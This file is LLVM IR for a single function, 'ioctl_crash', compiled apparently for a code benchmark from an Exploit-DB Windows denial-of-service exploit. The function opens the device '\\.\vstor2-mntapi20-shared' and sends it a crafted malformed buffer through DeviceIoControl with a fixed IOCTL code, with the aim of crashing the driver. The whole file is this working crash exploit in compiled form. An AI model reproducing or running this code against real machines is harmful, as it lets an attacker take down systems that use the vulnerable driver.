; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_42140.c_ioctl_crash.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_42140.c_ioctl_crash.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [27 x i32] [i32 92, i32 92, i32 46, i32 92, i32 118, i32 115, i32 116, i32 111, i32 114, i32 50, i32 45, i32 109, i32 110, i32 116, i32 97, i32 112, i32 105, i32 50, i32 48, i32 45, i32 115, i32 104, i32 97, i32 114, i32 101, i32 100, i32 0], align 4
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ioctl_crash() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [16348 x i8], align 16
  %5 = alloca [384 x i8], align 16
  store i8* bitcast ([27 x i32]* @.str to i8*), i8** %2, align 8
  %6 = load i8*, i8** %2, align 8
  %7 = load i32, i32* @GENERIC_READ, align 4
  %8 = load i32, i32* @GENERIC_WRITE, align 4
  %9 = or i32 %7, %8
  %10 = load i32, i32* @FILE_SHARE_READ, align 4
  %11 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %12 = or i32 %10, %11
  %13 = load i32, i32* @OPEN_EXISTING, align 4
  %14 = call i32 @CreateFileW(i8* %6, i32 %9, i32 %12, i32* null, i32 %13, i32 0, i32* null)
  store i32 %14, i32* %1, align 4
  %15 = bitcast [384 x i8]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %15, i8 0, i64 384, i1 false)
  %16 = bitcast i8* %15 to [384 x i8]*
  %17 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 0
  store i8 -128, i8* %17, align 16
  %18 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 1
  store i8 1, i8* %18, align 1
  %19 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 4
  store i8 -56, i8* %19, align 4
  %20 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 5
  store i8 -36, i8* %20, align 1
  %21 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 8
  store i8 -70, i8* %21, align 8
  %22 = getelementptr inbounds [384 x i8], [384 x i8]* %16, i32 0, i32 9
  store i8 -85, i8* %22, align 1
  %23 = load i32, i32* %1, align 4
  %24 = getelementptr inbounds [384 x i8], [384 x i8]* %5, i64 0, i64 0
  %25 = getelementptr inbounds [16348 x i8], [16348 x i8]* %4, i64 0, i64 0
  %26 = call i32 @DeviceIoControl(i32 %23, i32 2752556, i8* %24, i32 382, i8* %25, i32 16348, i32* %3, i32* null)
  ret void
}

declare dso_local i32 @CreateFileW(i8*, i32, i32, i32*, i32, i32, i32*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @DeviceIoControl(i32, i32, i8*, i32, i8*, i32, i32*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
